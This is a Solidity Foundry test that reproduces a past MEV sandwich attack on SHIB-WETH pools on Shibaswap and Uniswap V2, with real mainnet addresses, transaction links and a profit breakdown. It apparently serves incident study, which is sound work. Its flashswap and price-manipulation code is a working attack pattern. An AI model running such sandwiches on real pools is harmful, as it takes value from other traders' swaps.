// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "../interface/UniswapV2Pair.sol";
import "../interface/UniswapV2Router02.sol";

contract ContractTest is Test {
    UniswapV2Pair uniPair = UniswapV2Pair(0x811beEd0119b4AfCE20D2583EB608C6F7AF1954f);
    UniswapV2Pair shibaPair = UniswapV2Pair(0xCF6dAAB95c476106ECa715D48DE4b13287ffDEAa);
    UniswapV2Router02 uniRouter = UniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    UniswapV2Router02 shibaRouter = UniswapV2Router02(0x03f7724180AA6b939894B5Ca4314783B0b36b329);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 SHIB = IERC20(0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE);

    function setUp() public {
        address mevBotAddr = 0x6ECB10B62a1EEA81C24f88dcebd6fa316F12d598;
        // Initial WETH in mev bot, here impersonate this because some WETH need to front repay the flashswap later
        deal(address(WETH), address(this), WETH.balanceOf(mevBotAddr));
        SHIB.approve(address(uniRouter), type(uint).max);
        SHIB.approve(address(shibaRouter), type(uint).max);
    }

    function testMEV() public {
        // First transaction: MEV bot execute flashswap with Shibaswap SHIB-WETH pair
        // https://etherscan.io/tx/0x249be517d31f78626a16bc34f3dee0977452271fddcbf3799eaffbb50f8990ae
        shibaPair.swap(77_404_961_565.477707441503785943 ether, 0, address(this), bytes("1"));

        // Second transaction: random swap in Uniswap SHIB-WETH pair
        // https://etherscan.io/tx/0x8e0933316a1ed5c4bafe03d5c72cbcf3b744f5a8bca2c94c0afa8f3707f158a3
        deal(address(SHIB), address(this), 4_000_000_000 ether); // impersonate SHIB amount to swap
        address[] memory path2 = new address[](2);
        path2[0] = address(SHIB);
        path2[1] = address(WETH);
        uniRouter.swapExactTokensForTokens(4_000_000_000 ether, 0, path2, address(1234), block.timestamp);
        // Here put recipient to address(1234) so that we can get exact amount of WETH from Uniswap V2
        // console.log(WETH.balanceOf(address(1234)));
        // 6.117485376855809309
        // 9.176194387976692713 without sandwiched, sandwich make this random swap lost ~3 WETH
        // This random swap make the SHIB price even lower in Uniswap SHIB-WETH pair

        // Third transaction: MEV bot execute flashswap with Uniswap SHIB-WETH pair
        // https://etherscan.io/tx/0x17b3b17b1d217cb5049337e6d1137cf3737a8c8ae1681e48a9c9f9539e3547ff
        uniPair.swap(80_514_959_023.997785368459695451 ether, 0, address(this), bytes("2"));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
        if (keccak256(data) == keccak256(bytes("1"))) {
            // Bot swap ~77b SHIB for ~146 WETH with Uniswap V2, make SHIB price lower in Uniswap SHIB-WETH pair
            address[] memory path = new address[](2);
            path[0] = address(SHIB);
            path[1] = address(WETH);
            amount1 = uniRouter.swapExactTokensForTokens(amount0, 0, path, address(this), block.timestamp)[1];
            // console.log(amount1); // 146.561676709827356068 WETH
            // Calculate out WETH needed to repay the flashswap
            address[] memory path1 = new address[](2);
            path1[0] = address(WETH);
            path1[1] = address(SHIB);
            uint WETHAmt = shibaRouter.getAmountsIn(amount0, path1)[0];
            // console.log(WETHAmt); // 187.470310103105631349
            // Repay with WETH with ~146 WETH above + ~41 WETH owned by MEV bot
            WETH.transfer(address(shibaPair), WETHAmt);
        } else {
            // Bot swap ~80b SHIB for ~193 WETH with Shibaswap
            address[] memory path = new address[](2);
            path[0] = address(SHIB);
            path[1] = address(WETH);
            amount1 = shibaRouter.swapExactTokensForTokens(amount0, 0, path, address(this), block.timestamp)[1];
            // console.log(amount1); // 193.620641037547629557
            // Calculate out WETH needed to repay the flashswap
            // Because SHIB price had been manipulate to become cheaper from first & second transaction,
            // need ~151 WETH only to repay flashswap loan of ~80b SHIB
            address[] memory path1 = new address[](2);
            path1[0] = address(WETH);
            path1[1] = address(SHIB);
            uint WETHAmt = uniRouter.getAmountsIn(amount0, path1)[0];
            // console.log(WETHAmt); // 151.529771247365193728
            WETH.transfer(address(uniPair), WETHAmt);
        }
        sender; // unused variable
    }

    // Profit / Loss
    // First transaction bot swap ~77b SHIB for ~146 WETH and repay ~187 WETH to Shibaswap,
    // ~187 WETH - ~146 WETH = ~41 WETH which fronted by the bot
    // Third transaction bot swap ~80b SHIB for ~193 WETH
    // Repay ~151 WETH to Uniswap: ~193 WETH - ~151 WETH = ~42 WETH
    // ~42 WETH - ~41 WETH = ~1 WETH profit
}
